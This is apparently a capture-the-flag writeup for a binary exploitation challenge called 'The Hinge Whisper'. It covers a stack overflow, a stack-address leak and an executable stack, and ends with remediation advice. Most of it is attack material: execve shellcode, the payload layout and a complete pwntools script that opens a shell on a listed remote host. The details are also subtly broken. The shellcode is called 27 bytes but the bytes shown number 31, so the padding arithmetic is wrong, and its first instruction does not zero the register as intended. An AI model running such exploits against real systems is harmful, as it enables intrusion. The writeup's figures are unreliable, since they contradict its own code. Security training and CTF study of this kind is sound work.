# HTB Pwn Challenge — "The Hinge Whisper" — Writeup

**Target:** `154.57.164.77:30625` (Placeholder)
**Category:** Pwn / Binary Exploitation (ret2shellcode / Executable Stack)
**Stack:** ELF 64-bit LSB Shared Object (PIE / ET_DYN), dynamically linked. Stack is executable (`PT_GNU_STACK` permissions = RWX).

---

## Summary

The `the_hinge_whisper` challenge presents a 64-bit ELF binary representing a security hatch combination lock. 

The binary is vulnerable to a stack buffer overflow combined with a stack leak and an executable stack:
1. **Stack Leak**: The program prints the virtual stack address of the buffer (`  [+] The keyway sits at: %p`).
2. **Stack Buffer Overflow**: In the `service_hatch` function, `read` reads `0x50` (80) bytes into a `0x40` (64) byte local stack buffer, allowing exactly enough room to overwrite the return address.
3. **Executable Stack (No NX)**: The ELF binary is compiled with an executable stack (`PT_GNU_STACK` flags `PF_R | PF_W | PF_X = 7`), which allows us to inject shellcode directly into the stack buffer and execute it by jumping to the leaked address.

---

## Vulnerability Analysis

### 1. Check Security Mitigations
Auditing the binary reveals that it is compiled as `ET_DYN` (Position Independent Executable), so the load address of code pages is randomized. However, the stack is executable:
* **NX (No-Execute)**: Disabled (Stack is `RWX`).
* **Stack Canary**: Disabled (No stack cookies checking).
* **ASLR/PIE**: Enabled, but bypassed by the program explicitly printing the stack buffer address.

### 2. Decompiling `service_hatch`
The function disassembles as follows:
```assembly
0x11eb:    sub     rsp, 0x40            ; Allocate 64 bytes for buffer
0x11ef:    lea     rax, [rbp - 0x40]    ; Buffer address
0x11f3:    mov     rsi, rax             ; Address passed to printf (%p)
...
0x122d:    lea     rax, [rbp - 0x40]
0x1231:    mov     edx, 0x50            ; Read bound: 80 bytes
0x1236:    mov     rsi, rax
0x1239:    mov     edi, 0
0x123e:    call    read
```
* **Buffer Capacity**: `64` bytes (`rbp - 0x40` to `rbp`).
* **Input Bound**: `80` bytes.
* **Leak**: The code prints the address of `rbp - 0x40` using `printf("  [+] The keyway sits at: %p\n", rbp - 0x40)`.

### 3. Stack Layout
* Padding from the start of the buffer to the saved return address:
  * Buffer space: `64` bytes.
  * Saved Base Pointer (`rbp`): `8` bytes.
  * Saved Return Address: starts at offset `64 + 8 = 72` bytes.
* Total payload length = `80` bytes (`72` bytes padding/shellcode + `8` bytes return address).

---

## Exploitation Walkthrough

### 1. Shellcode Selection
We use standard 64-bit shellcode to spawn `/bin/sh` via the `execve` system call (27 bytes):
```python
shellcode = b"\x48\x31\xf0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
```

### 2. Payload Construction
1. Put the `27` byte shellcode at the very start of the stack buffer.
2. Add `45` bytes of padding (NOPs or garbage) to reach the return address offset (`72 - 27 = 45`).
3. Overwrite the saved return address with the 8-byte leaked stack address (which points to the beginning of our shellcode).

```python
payload = shellcode + b"\x90" * 45 + p64(leaked_address)
```

### 3. Automated Exploit Script (Pwntools)

```python
from pwn import *

# Context configuration
elf = context.binary = ELF('./the_hinge_whisper')

# Target setup
local = True
if local:
    io = process('./the_hinge_whisper')
else:
    io = remote('154.57.164.77', 30625)

# Read leak
io.recvuntil(b"The keyway sits at: ")
leak = int(io.recvline().strip(), 16)
log.info(f"Leaked stack address: {hex(leak)}")

# Construct payload
# 64-bit execve /bin/sh shellcode (27 bytes)
shellcode = b"\x48\x31\xf0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

payload = shellcode + b"\x90" * 45 + p64(leak)

# Send payload
io.sendafter(b"Forge your latch-key: ", payload)

# Interactive shell
io.interactive()
```

---

## Remediation

1. **Enable Stack Executability Protection (NX)**: Compile with `-z noexecstack` to prevent the execution of code resident in the stack pages.
2. **Verify Input Sizes**: Ensure the `read` bound does not exceed the buffer capacity:
   ```c
   char buffer[64];
   read(0, buffer, sizeof(buffer)); // Secure: limits read to 64 bytes
   ```
3. **Remove Diagnostic Leaks**: Remove print functions that leak pointer references to active stack frames.
